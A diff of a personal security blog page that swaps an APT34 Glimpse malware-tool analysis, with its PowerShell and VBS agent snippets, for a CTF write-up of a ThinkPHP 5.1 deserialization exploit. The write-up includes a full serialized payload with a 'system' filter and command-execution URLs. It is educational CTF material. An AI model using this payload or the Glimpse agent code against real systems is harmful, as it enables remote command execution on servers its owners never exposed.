@@ -20,28 +20,27 @@
     var CONFIG = {"hostname":"jason1314zhang.github.io","root":"/","scheme":"Gemini","version":"7.7.2","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="0x00 背景这阵子接到一个任务，需要我对powershell无文件攻击进行分析。在找了一圈资料之后，最后决定对APT34（带有伊朗背景）的远程powershell工具Glimpse进行分析，虽然最后的结果并不完美，暂且记录一下。">
+  <meta name="description" content="前言这道题目的环境是有问题的，我不知道是BUUCTF上的环境问题，还是说Nu1l官方的docker环境有问题。提供的源代码与环境自身的源代码不一致，导致浪费了很多时间，并且官方给的exp和wp无法对应，对于没有做过tp利用链的人来说门槛较高，还需要自己去debug，不过确实学到了很多，下面开始WP。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="APT34 Glimpse 工具初探">
-<meta property="og:url" content="https://jason1314zhang.github.io/blog/APT34-Glimpse/index.html">
+<meta property="og:title" content="N1BOOK thinkphp反序列化利用链">
+<meta property="og:url" content="https://jason1314zhang.github.io/blog/N1BOOK-thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/index.html">
 <meta property="og:site_name" content="SuperJason&#39;s blog">
-<meta property="og:description" content="0x00 背景这阵子接到一个任务，需要我对powershell无文件攻击进行分析。在找了一圈资料之后，最后决定对APT34（带有伊朗背景）的远程powershell工具Glimpse进行分析，虽然最后的结果并不完美，暂且记录一下。">
+<meta property="og:description" content="前言这道题目的环境是有问题的，我不知道是BUUCTF上的环境问题，还是说Nu1l官方的docker环境有问题。提供的源代码与环境自身的源代码不一致，导致浪费了很多时间，并且官方给的exp和wp无法对应，对于没有做过tp利用链的人来说门槛较高，还需要自己去debug，不过确实学到了很多，下面开始WP。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://jason1314zhang.github.io/blog/APT34-Glimpse/7t10.png">
-<meta property="og:image" content="https://jason1314zhang.github.io/blog/APT34-Glimpse/10to7.png">
-<meta property="og:image" content="https://jason1314zhang.github.io/blog/APT34-Glimpse/run.png">
-<meta property="og:image" content="https://jason1314zhang.github.io/blog/APT34-Glimpse/port.png">
-<meta property="og:image" content="https://jason1314zhang.github.io/blog/APT34-Glimpse/visual.png">
-<meta property="article:published_time" content="2020-04-05T10:25:49.000Z">
-<meta property="article:modified_time" content="2020-04-05T13:25:26.000Z">
+<meta property="og:image" content="https://jason1314zhang.github.io/blog/N1BOOK-thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/phpunser-5.png">
+<meta property="og:image" content="https://jason1314zhang.github.io/blog/N1BOOK-thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/phpunser-1.png">
+<meta property="og:image" content="https://jason1314zhang.github.io/blog/N1BOOK-thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/phpunser-2.png">
+<meta property="og:image" content="https://jason1314zhang.github.io/blog/N1BOOK-thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/phpunser-3.png">
+<meta property="og:image" content="https://jason1314zhang.github.io/blog/N1BOOK-thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/phpunser-4.png">
+<meta property="article:published_time" content="2020-12-29T14:06:45.000Z">
+<meta property="article:modified_time" content="2020-12-29T14:12:33.045Z">
 <meta property="article:author" content="SuperJason">
-<meta property="article:tag" content="APT34">
-<meta property="article:tag" content="Glimpse">
-<meta property="article:tag" content="Tool">
+<meta property="article:tag" content="thinkphp 5.1">
+<meta property="article:tag" content="反序列化">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://jason1314zhang.github.io/blog/APT34-Glimpse/7t10.png">
+<meta name="twitter:image" content="https://jason1314zhang.github.io/blog/N1BOOK-thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/phpunser-5.png">
 
-<link rel="canonical" href="https://jason1314zhang.github.io/blog/APT34-Glimpse/">
+<link rel="canonical" href="https://jason1314zhang.github.io/blog/N1BOOK-thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/">
 
 
 <script id="page-configurations">
@@ -53,7 +52,7 @@
   };
 </script>
 
-  <title>APT34 Glimpse 工具初探 | SuperJason's blog</title>
+  <title>N1BOOK thinkphp反序列化利用链 | SuperJason's blog</title>
   
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-HZQ6CYEV9N"></script>
     <script>
@@ -222,7 +221,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://jason1314zhang.github.io/blog/APT34-Glimpse/">
+    <link itemprop="mainEntityOfPage" href="https://jason1314zhang.github.io/blog/N1BOOK-thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -235,7 +234,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          APT34 Glimpse 工具初探
+          N1BOOK thinkphp反序列化利用链
         </h1>
 
         <div class="post-meta">
@@ -246,7 +245,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-04-05 18:25:49 / 修改时间：21:25:26" itemprop="dateCreated datePublished" datetime="2020-04-05T18:25:49+08:00">2020-04-05</time>
+              <time title="创建时间：2020-12-29 22:06:45 / 修改时间：22:12:33" itemprop="dateCreated datePublished" datetime="2020-12-29T22:06:45+08:00">2020-12-29</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -254,7 +253,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/APT/" itemprop="url" rel="index"><span itemprop="name">APT</span></a>
+                  <a href="/categories/N1BOOK-CTF/" itemprop="url" rel="index"><span itemprop="name">N1BOOK CTF</span></a>
                 </span>
             </span>
 
@@ -276,47 +275,35 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h1><p>这阵子接到一个任务，需要我对powershell无文件攻击进行分析。在找了一圈资料之后，最后决定对APT34（带有伊朗背景）的远程powershell工具Glimpse进行分析，虽然最后的结果并不完美，暂且记录一下。</p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这道题目的环境是有问题的，我不知道是BUUCTF上的环境问题，还是说Nu1l官方的docker环境有问题。提供的源代码与环境自身的源代码不一致，导致浪费了很多时间，并且官方给的exp和wp无法对应，对于没有做过tp利用链的人来说门槛较高，还需要自己去debug，不过确实学到了很多，下面开始WP。</p>
 <a id="more"></a>
-
-<h1 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h1><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vY29sdW1uLzIwMjA5My5odG1s" title="https://www.freebuf.com/column/202093.html">APT34攻击样本分析-绿盟<i class="fa fa-external-link"></i></span></p>
-<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JsYWNrb3JiaXJkL0FQVF9SRVBPUlQvdHJlZS9tYXN0ZXIvQVBUMzQ=" title="https://github.com/blackorbird/APT_REPORT/tree/master/APT34">APT34工具Github<i class="fa fa-external-link"></i></span></p>
-<h1 id="0x01-Glimpse概述"><a href="#0x01-Glimpse概述" class="headerlink" title="0x01 Glimpse概述"></a>0x01 Glimpse概述</h1><p>该工具利用DNS协议进行通信，可以在agent端和server端传输指令信息，是一款远程控制工具。主要包括三个部分：agent、panel、server</p>
-<ol>
-<li>agent<br>agent为受控端，包含1个vbs脚本和3个ps1脚本<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">runner_.vbs 用于启动ps1脚本</span><br><span class="line">dns.psl 用于与服务端通信</span><br><span class="line">dns_main.psl 用于与服务端通信</span><br><span class="line">refineddns_main.ps1 用于与服务端通信</span><br></pre></td></tr></table></figure></li>
-<li>panel<br>panel是服务器端可视化工具，可以对通信信息进行监视<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">newPanel-dbg.exe 可视化程序</span><br><span class="line">ToggleSwitch.dll 用来处理信息交互</span><br></pre></td></tr></table></figure></li>
-<li>server<br>server是服务器端，接收并解析agent端的DNS请求，向agent端下发指令<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">srvr.js 用来处理信息交互的js脚本</span><br></pre></td></tr></table></figure>
-
-
-
+<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p><code>n1book{de70641304640057390e8fabc8b515bf}</code></p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol>
+<li>访问环境时提示下载源代码<code>www.zip</code><br><img src="/blog/N1BOOK-thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/phpunser-5.png" alt> </li>
+<li>下载源代码后解压缩，通过阅读readme.md发现是thinkphp 5.1版本，网上搜索后，得到<a href="scripts/thinkphp_5.1_exp.php">利用链thinkphp_5.1_exp.php文件</a>，只需执行<code>php thinkphp_5.1_exp.php</code>，便可以得到payload。关于利用链的构造网上很多大神分析了，可以看[Thinkphp 5.1 反序列化利用链深入分析]，我就不分析了，重点讲下做题。(<span class="exturl" data-url="aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzEwNDAv" title="https://paper.seebug.org/1040/">https://paper.seebug.org/1040/<i class="fa fa-external-link"></i></span>)  <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">   payload内容如下：</span><br><span class="line">   O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A1%3A%22a%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A0%3A%22%22%3B%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A13%3A%22think%5CRequest%22%3A3%3A%7Bs%3A7%3A%22%00%2A%00hook%22%3Ba%3A1%3A%7Bs%3A7%3A%22visible%22%3Ba%3A2%3A%7Bi%3A0%3Br%3A8%3Bi%3A1%3Bs%3A6%3A%22isAjax%22%3B%7D%7Ds%3A9%3A%22%00%2A%00filter%22%3Bs%3A6%3A%22system%22%3Bs%3A9%3A%22%00%2A%00config%22%3Ba%3A1%3A%7Bs%3A8%3A%22var_ajax%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D%7D%7D%7D</span><br><span class="line">   <span class="string">``</span><span class="string">` </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3. 这里分析一下thinkphp的2个主要文件，然后分析一下[利用链thinkphp_5.1_exp.php文件](thinkphp_5.1_exp.php) </span></span><br><span class="line"><span class="string">   1. application\index\controller\index.php文件,只有请求被hello解析时，才能通过构造POST请求将payload赋值给str，实现反序列化利用。</span></span><br><span class="line"><span class="string">      `</span><span class="string">``</span>php</span><br><span class="line">      &lt;?php</span><br><span class="line">      namespace app\<span class="keyword">index</span>\controller;</span><br><span class="line"></span><br><span class="line">      class Index</span><br><span class="line">      &#123;</span><br><span class="line">         public function <span class="keyword">index</span>()</span><br><span class="line">         &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;a href='www.zip'&gt;download code&lt;/a&gt;"</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         public function hello()</span><br><span class="line">         &#123;</span><br><span class="line">            unserialize($_POST[<span class="string">'str'</span>]);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>route\route.php文件，压缩包源代码与实际BUUCTF服务器代码不一样。本人先在本地phpstudy搭建环境获得命令执行权限后，服务器相同url却不能获得权限，后来证实原因是路由代码不一致。<ul>
+<li>压缩包代码如下 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Route::get(<span class="string">'think'</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">'hello,ThinkPHP5!'</span>;</span><br><span class="line">&#125;);</span><br><span class="line">Route::get(<span class="string">'hello/:name'</span>, <span class="string">'index/hello'</span>);</span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">];</span><br></pre></td></tr></table></figure></li>
+<li>BUUCTF服务器代码 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_file($_SERVER[<span class="string">"DOCUMENT_ROOT"</span>] . $_SERVER[<span class="string">"SCRIPT_NAME"</span>])) </span><br><span class="line">&#123; <span class="keyword">return</span> <span class="keyword">false</span>; &#125; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; <span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">"/index.php"</span>; &#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
 </li>
+<li><a href="scripts/thinkphp_5.1_exp.php">利用链thinkphp_5.1_exp.php文件</a>前几行内容如下，其中<code>a</code>参数用来承载实际执行的命令。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">   <span class="keyword">protected</span> $append = [];</span><br><span class="line">   <span class="keyword">private</span> $data = [];</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;append = [<span class="string">"a"</span>=&gt;[<span class="string">""</span>]]; </span><br><span class="line">      <span class="keyword">$this</span>-&gt;data = [<span class="string">"a"</span>=&gt;<span class="keyword">new</span> Request()];</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
 </ol>
-<h1 id="0x02-实验环境"><a href="#0x02-实验环境" class="headerlink" title="0x02 实验环境"></a>0x02 实验环境</h1><p>首先创建了两台虚拟机，win7（<strong>192.168.48.131</strong>）和win10（<strong>192.168.48.129</strong>）。然后配置虚拟网络映射器，使两台虚拟机组网后位于同一局域网络，并且与主机不在同一局域网 <strong>（样本有风险，实验环境应该与外网和主机隔离）</strong>，关闭防火墙，保证两台虚拟机之间能ping通。<br><br>    win7 ping win10<br><br>    <img src="/blog/APT34-Glimpse/7t10.png" alt><br><br>    win10 ping win7<br><br>    <img src="/blog/APT34-Glimpse/10to7.png" alt></p>
-<h1 id="0x03-实验分析"><a href="#0x03-实验分析" class="headerlink" title="0x03 实验分析"></a>0x03 实验分析</h1><p>分为3个部分：<strong>agent、server、panel</strong></p>
-<ol>
-<li><p>agent – win7 192.168.48.131<br><br>修改runner_.vbs脚本内容,将<strong>AGENT PATH</strong>改为实际文件路径，这里我改为同文件目录的dns.ps1</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set sh=CreateObject("Wscript.Shell")</span><br><span class="line">sh.Run "powershell -exec bypass -file &lt;AGENT PATH&gt;", 0, False</span><br></pre></td></tr></table></figure>
-<p>修改dns.ps1文件，修改server地址（这里我改为win10的ip 192.168.48.129）</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">MMC = <span class="string">"&lt;MALICIOUS SERVER&gt;"</span>; <span class="comment">#填写服务器地址</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">NNC = <span class="variable">$env</span>:PUBLIC + <span class="string">"\Libraries"</span>;</span></span><br><span class="line">if (-not (Test-Path $NNC)) &#123; md $NNC; &#125;</span><br><span class="line"><span class="meta">$</span><span class="bash">OOC = <span class="variable">$NNC</span> + <span class="string">"\quid"</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">PPC = <span class="variable">$NNC</span> + <span class="string">"\lock"</span>;</span></span><br><span class="line">if (!(Test-Path $PPC))&#123;sc -Path $PPC -Value $pid;&#125;</span><br><span class="line">else</span><br><span class="line"> &#123;</span><br><span class="line">     $QQC = (NEW-TIMESPAN -Start ((Get-ChildItem $PPC).CreationTime) -End (Get-Date)).Minutes</span><br><span class="line">     if ($QQC -gt 10)</span><br><span class="line">     &#123;</span><br><span class="line">         stop-process -id (gc $PPC);</span><br><span class="line">         ri -Path $PPC;</span><br><span class="line">     &#125;</span><br><span class="line">     return;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
-<p>双击运行runner_.vbs脚本，它会启动dns.ps1脚本，在C:\Users\Public目录下新建Libraries文件夹，其文件树结构如下，除了生成两个文件夹以外，还生成了一个quid文件（内容为uid，即此处的198320f4c4）<br><br><img src="/blog/APT34-Glimpse/run.png" alt><br></p>
 </li>
-<li><p>server – win10 192.168.48.129<br>安装<span class="exturl" data-url="aHR0cHM6Ly9ub2RlanMub3JnL2VuLw==" title="https://nodejs.org/en/">nodejs<i class="fa fa-external-link"></i></span><br>创建一个项目文件夹（这里我的是APT34_RCE），将服务端文件srvr.js复制到当前路径，初始化nodejs项目</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm init</span><br></pre></td></tr></table></figure>
-<p>在当前文件夹路径安装相关依赖包（npm国外源很慢，可以换cnpm用国内taobao源）</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install --save body-parser cookies child_process dnsd webix express ip fs path sqlite3 http portscanner child_process async ejs express-fileupload dateformat multer file-base64 flat-file-db moment busboy</span><br><span class="line">npm install --save -g forever</span><br></pre></td></tr></table></figure>
-<p>cmd打开当前路径，开启server（下面的命令会让服务端持久运行）</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forever start srvr.js</span><br></pre></td></tr></table></figure>
-<p>它会在目录C:\ProgramData下创建文件夹Glimpse，用来保存与agent的通信信息<br><br><img src="/blog/APT34-Glimpse/port.png" alt><br><br><strong>服务端的理想情况是监听本机ip的53端口，但自己测试的时候，用netstat -ano | findstr 53命令查找53端口，其并没有在监听。网上找到的攻击成功的截图都来自原作者的telegram</strong></p>
-</li>
-<li><p>panel<br>在图形化面板panel模块，也没有得到agent与server的通信信息<br><br><img src="/blog/APT34-Glimpse/visual.png" alt></p>
-</li>
+<li>本机phpstudy环境下，根据源代码构造了两种url请求，以whoami为例子。第一个请求路由为<em>application\index\controller\index.php文件</em>-&gt;<em>Index类</em>-&gt;<em>hello()方法</em>，第二个请求利用了thinkphp的<span class="exturl" data-url="aHR0cHM6Ly9tLnBocC5jbi9waHBrai90aGlua3BocC80NDg0ODAuaHRtbA==" title="https://m.php.cn/phpkj/thinkphp/448480.html">兼容模式url<i class="fa fa-external-link"></i></span></li>
 </ol>
-<h1 id="0x04-自闭"><a href="#0x04-自闭" class="headerlink" title="0x04 自闭"></a>0x04 自闭</h1><p>花了一天的时间去找问题，目前还没有解决…开始自闭…<br><br><strong>怀疑是以下原因</strong></p>
-<ol>
-<li>两台虚拟机均没有连接外网，DNS解析maybe失败</li>
-<li>agent和server配置出错</li>
-<li>该工具本身不完整</li>
+<ul>
+<li><code>http://{your_server}/public/index.php/index/Index/hello?a=whoami</code></li>
+<li><code>http://{your_server}/public/index.php?s=index/index/hello&amp;a=whoami</code><br><img src="/blog/N1BOOK-thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/phpunser-1.png" alt><br><img src="/blog/N1BOOK-thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/phpunser-2.png" alt></li>
+</ul>
+<ol start="5">
+<li>介绍完本机命令执行，再来介绍BUUCTF命令执行。服务器只能用第二种请求，构造参数<code>a=cd /;ls</code>和<code>a=cd /;cat FLAG</code>，<code>str</code>的值为1中payload，通过<code>hackbar</code>或<code>burpsuite</code>发包。<br><img src="/blog/N1BOOK-thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/phpunser-3.png" alt><br><img src="/blog/N1BOOK-thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/phpunser-4.png" alt> <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>thinkphp 5.1的反序列化漏洞，由于thinkphp 5.1还存在RCE漏洞(漏洞触发条件是默认路由情况下，可以导致RCE)，所以这道题源代码的route.php修改了默认路由，不能直接通过RCE执行命令，只能按着出题人思路用php反序列化。<br>难点如下</li>
 </ol>
+<ul>
+<li>找到利用点，application\index\controller\index.php文件的hello函数</li>
+<li>构造正确的路由，不清楚tp路由的话，很难构造正确的路由，正确构造<code>a</code>的值，post上传<code>str</code>的payload</li>
+<li>thinkphp5.1 php反序列化利用链</li>
+</ul>
 
     </div>
 
@@ -326,9 +313,8 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/APT34/" rel="tag"># APT34</a>
-              <a href="/tags/Glimpse/" rel="tag"># Glimpse</a>
-              <a href="/tags/Tool/" rel="tag"># Tool</a>
+              <a href="/tags/thinkphp-5-1/" rel="tag"># thinkphp 5.1</a>
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
           </div>
 
         
@@ -336,11 +322,11 @@
 
         
     <div class="post-nav">
-      <div class="post-nav-item"></div>
       <div class="post-nav-item">
-    <a href="/blog/%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B2020PC%E6%96%B9%E5%90%91%E5%88%9D%E8%B5%9B/" rel="next" title="腾讯游戏安全竞赛2020PC方向初赛">
-      腾讯游戏安全竞赛2020PC方向初赛 <i class="fa fa-chevron-right"></i>
+    <a href="/blog/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="prev" title="BUUCTF 命令执行">
+      <i class="fa fa-chevron-left"></i> BUUCTF 命令执行
     </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -400,7 +386,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-背景"><span class="nav-number">1.</span> <span class="nav-text">0x00 背景</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#REF"><span class="nav-number">2.</span> <span class="nav-text">REF</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-Glimpse概述"><span class="nav-number">3.</span> <span class="nav-text">0x01 Glimpse概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-实验环境"><span class="nav-number">4.</span> <span class="nav-text">0x02 实验环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-实验分析"><span class="nav-number">5.</span> <span class="nav-text">0x03 实验分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-自闭"><span class="nav-number">6.</span> <span class="nav-text">0x04 自闭</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag"><span class="nav-number">2.</span> <span class="nav-text">flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#思路"><span class="nav-number">3.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
